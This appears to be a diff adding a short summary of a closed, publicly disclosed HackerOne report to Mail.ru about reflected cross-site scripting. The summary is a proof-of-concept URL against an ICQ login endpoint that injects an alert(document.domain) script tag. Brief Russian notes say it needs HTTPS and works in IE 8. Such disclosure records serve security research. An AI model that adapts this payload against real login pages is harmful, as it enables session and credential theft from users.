@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/113336
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bigbear_
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.03.2017 13:13:59
+
+Summary:
+
+https://api.login.icq.net/auth/login?doSNSAuth=-1&f=qs&idType=OID&k=ao1-uaRbbNAqtYfG&succUrl=http://c.icq.com/webicq/iconuploader/1/redir.html&supportedIdType=SN"><script>alert(document.domain)</script><a="&doSNSAuth=0
+
+Тонкость: обязательно открывать через HTTPS.
+
+Работает IE 8.
